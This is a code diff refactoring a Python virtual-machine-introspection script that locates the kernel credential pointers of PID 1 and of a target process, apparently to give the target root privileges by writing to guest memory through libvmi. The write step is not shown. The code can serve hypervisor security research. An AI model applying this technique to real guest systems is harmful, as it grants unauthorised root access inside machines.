@@ -59,6 +59,19 @@ def get_task(addr_space, pid):
         return None
     return tasks[0]
 
+def get_credentails_pa(addr_space, task):
+
+    # Get virtual addresses for task credentials pointers
+    real_cred_va = task.real_cred.obj_offset
+    cred_va = task.cred.obj_offset
+
+    # Get Physical addresses for task credentials pointers
+    real_cred_pa = addr_space.vtop(real_cred_va)
+    cred_pa = addr_space.vtop(cred_va)
+
+    return real_cred_pa, cred_pa
+
+
 # Try catch should be more specific. 
 try:
     # Initialize address space (same as a=addrspace() in linux_volshell)
@@ -66,28 +79,18 @@ try:
 
     # Get target task object
     target_task = get_task(addr_space, target_pid)
-    if(not target_task):
+    if not target_task:
         print("Task with PID {} not found!".format(target_pid))
         sys.exit()
 
     # Get a task with root permissions, PID 1 is reliably root always
     task_with_root = get_task(addr_space, 1)
 
-    # Get virtual addresses for root task credentials pointers
-    root_real_cred_va = task_with_root.real_cred.obj_offset
-    root_cred_va = task_with_root.cred.obj_offset
-
     # Get Physical addresses for root task credentials pointers
-    root_real_cred_pa = addr_space.vtop(root_real_cred_va)
-    root_cred_pa = addr_space.vtop(root_cred_va)
+    root_real_cred_pa, root_cred_pa = get_credentails_pa(addr_space, task_with_root)
 
-    # Get virtual addresses for target task credentials pointers
-    target_real_cred_va = target_task.real_cred.obj_offset
-    target_cred_va = target_task.cred.obj_offset
-
-    # Get physical addresses for root task credentials pointers
-    target_real_cred_pa = addr_space.vtop(target_real_cred_va)
-    target_cred_pa = addr_space.vtop(target_cred_va)
+    # Get physical addresses for target task credentials pointers
+    target_real_cred_pa, target_cred_pa = get_credentails_pa(addr_space, target_task)
 
     # Initialize libvmi for writing. Note: the library initialize undesired "[][][]" 
     vmi = Libvmi(pvm_name)
